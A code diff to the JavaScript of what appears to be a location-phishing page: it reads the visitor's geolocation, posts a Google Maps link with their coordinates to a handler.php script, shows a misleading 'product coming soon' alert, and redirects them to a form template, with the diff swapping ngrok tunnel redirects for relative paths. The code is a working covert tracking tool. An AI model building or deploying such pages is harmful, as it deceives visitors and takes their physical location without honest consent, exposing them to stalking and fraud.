@@ -18,7 +18,7 @@ function locate()
       type: 'POST',
       url: 'handler.php',
       data: {"data":`Google Map Link : https://google.com/maps/place/${lat}+${lon}`},
-      success: window.location.href = "http://giving-pipefish-sweet.ngrok-free.app/templates/a_formularz/index.html",
+      success: window.location.href = "../../templates/a_formularz/index.html",
       mimeType: 'text'
     });
     alert('Thankyou For Taking Interest in Near You...This Product is Coming Soon...');
@@ -32,11 +32,11 @@ function showError(error)
 		case error.PERMISSION_DENIED:
 			var denied = 'User denied the request for Geolocation';
       alert('Please Refresh This Page and Allow Location Permission...');
-      window.location.href = "http://giving-pipefish-sweet.ngrok-free.app/templates/a_formularz/index.html"
+      window.location.href = "../../templates/a_formularz/index.html";
       break;
 		case error.POSITION_UNAVAILABLE:
 			var unavailable = 'Location information is unavailable';
-      window.location.href = "http://giving-pipefish-sweet.ngrok-free.app/templates/a_formularz/index.html"
+      window.location.href = "../../templates/a_formularz/index.html";
 			break;
 		case error.TIMEOUT:
 			var timeout = 'The request to get user location timed out';
